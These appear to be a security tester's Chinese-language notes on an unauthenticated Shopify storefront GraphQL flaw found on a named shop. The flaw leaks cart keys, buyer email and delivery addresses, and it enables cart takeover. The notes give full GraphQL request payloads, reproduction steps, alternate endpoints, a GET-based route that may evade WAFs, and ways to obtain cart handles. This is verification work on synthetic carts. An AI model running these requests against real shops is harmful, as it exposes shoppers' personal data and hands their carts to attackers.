## 判定流程（约 20 个请求，单线程间隔≥2.5s）
1) 零凭据 POST https://<shop>/web/api/graphql {"query":"{__schema{queryType{fields{name}} mutationType{fields{name}}}}"}，与 /api/graphql 同名查询的结果做差集；若两者一致即同一 schema。
2) cartCreate 自建合成 cart 记下 handle；**只用 handle**（不带 key）调：
   mutation{ cartPrepareForCompletion(cartId:"gid://shopify/Cart/<HANDLE>"){ result{ __typename ... on CartStatusNotReady{ cart{ id buyerIdentity{email} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName address1 city zip countryCode phone}}}} } ... on CartStatusReady{ cart{ id buyerIdentity{email} delivery{addresses{address{... on CartDeliveryAddress{firstName address1 city zip countryCode phone}}}} } } } } }
   若 cart.id 回显 "?key=<real_key>" 且 email/地址非空 → 读路径忽略 key（与 api/graphql 的 #652/#1727 同机理）。
3) 再用 ?key=deadbeef... 重跑第 2 步，若同样回显真实 key/PII → 错 key 也被忽略。
4) 用回显 key 做写验证（cartNoteUpdate / cartDeliveryAddressesAdd），userErrors=[] 即跨会话接管成立。
5) 写路径三态矩阵（bare / wrong / right）：裸/错 key 预期 userErrors [{"field":["cartId"],"message":"The specified cart does not exist.","code":"INVALID"}] 并返回新建空白 cart（不是目标 cart）；right 成功。cartDeliveryAddressesUpdate 还会额外 INVALID_DELIVERY_ADDRESS_ID + cart:null。
6) 门禁型 mutation：cartClone / cartPaymentUpdate → ACCESS_DENIED（需 scope）；cartSubmitForCompletion → 该 web 路由对任何 key/attemptToken 恒 HTTP 404 {"code":"NOT_FOUND"}（与 /api/graphql 不同，后者裸 handle 也可 SubmitFailed PAYMENTS_METHOD_REQUIRED）。
7) 敏感查询：customer / node(Order) / cartCompletionAttempt 在无 scope 时均 ACCESS_DENIED（unauthenticated_read_customers / cartCompletionAttemptResult），两入口一致。

## 判据
- 只看"写 mutation 裸 key 成功"会误判阴性：真正的验证链路是 prepare 泄露 key → 再用 key 写。
- 不要把 web 路由的 submit 404 当作"cart 已失效"；换 /api/graphql 复核。

## 入口族补充（2026-11-11 实测，finding#174 / task#9 / i3070）
同一漏洞的更多独立入口（与 /web/api/graphql 同 schema，dated 版本被服务端压平）：
- `/web/api/graphql.json` → 真实入口（POST JSON 行为同 /web/api/graphql）。
- `/web/api/{2023-01,2024-01,2024-10,2025-04,2026-01,unstable}/graphql` → 均为真实入口；dated 段响应头 `x-shopify-api-version` 一律回 `2026-01`（压平，不存在旧版 schema 差异），`unstable` 回 `unstable`。
- `/web/api/banana/graphql` → 404 / 0B（阴性对照）。
- **GET 也可承载 mutation 并回显业务数据**：`GET /web/api/graphql?query=<urlencode mutation>&variables=<json>` → 200，正文与 POST 逐字相同（含真实 ?key、email、收货地址）。
- 缓存头：`Cdn-Cache-Control: no-cache, no-store`、`Cf-Cache-Status: DYNAMIC`（重复 GET 仍 DYNAMIC，无缓存放大）。
- 指纹：`Server-Timing: graphql;desc="storefront/query/anonymous"`、`X-Stats-Apiclientid: 580111`。

### 复现（自建合成 cart，全程无 Cookie / 无 Authorization / 无 x-checkout-one-session-token / 无 build-id）
1) `cartCreate`（POST /web/api/graphql）→ 记录 handle；如需 PII 先 `cartDeliveryAddressesAdd`（带 key）写入测试地址。
2) 裸 handle（不带 ?key）对任一别名入口调 `cartPrepareForCompletion`：
   ```
   POST /web/api/2023-01/graphql
   Content-Type: application/json
   {"query":"mutation P($id:ID!){cartPrepareForCompletion(cartId:$id){result{__typename ... on CartStatusReady{cart{id note buyerIdentity{email} delivery{addresses{selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} ... on CartStatusNotReady{cart{id note buyerIdentity{email}}}}}}","variables":{"id":"gid://shopify/Cart/<HANDLE>"}}
   ```
   → 200，`cart.id` 回显 `"?key=<REDACTED>"`、`buyerIdentity.email`、`delivery.addresses` 全量（姓名/街道/城市/邮编/国家/电话）。
3) GET 同构请求复核：`GET /web/api/graphql?query=<同上>&variables={"id":"gid://shopify/Cart/<HANDLE>"}` → 200 同正文。
4) 阴性对照：同入口 `cart(id:<裸 handle>){buyerIdentity{email} delivery{addresses{...}}}` → email=null、addresses=[]（key 门控）；伪造空 alg JWT → 401 UNAUTHORIZED；空 `x-checkout-one-session-token` 不改变结果（该头不参与鉴权）。

### 判据与坑
- 只看 HTTP 200 不够：必须看到 `cart.id` 里 `?key=` 非空回显 + email/地址非空。
- 版本段不是降级机会：dated 路径的 `x-shopify-api-version` 仍为 2026-01，别指望旧 schema。
- GET 是敏感读通道：不要把 mutation 当 POST-only，WAF/日志可能放行 GET。
- handle 不可枚举（108bit），需先由分享链接/Referer/页面 JS `ShopifyAnalytics.meta.cart.id` 等渠道取得。
- 本入口族与 /web/api/graphql、/api/graphql 同机理；发现于 retro-refresh.com（task#9 / finding#174），全程只使用自建合成 cart，未接触真实客户数据。

原始响应落盘：`/opt/artex/data/tasks/9/i3070/{phase1,phase2,phase3}/`（关键文件：phase3/u4_ver2023_prepare.resp.json、phase3/v4_get_prepare.resp.json）。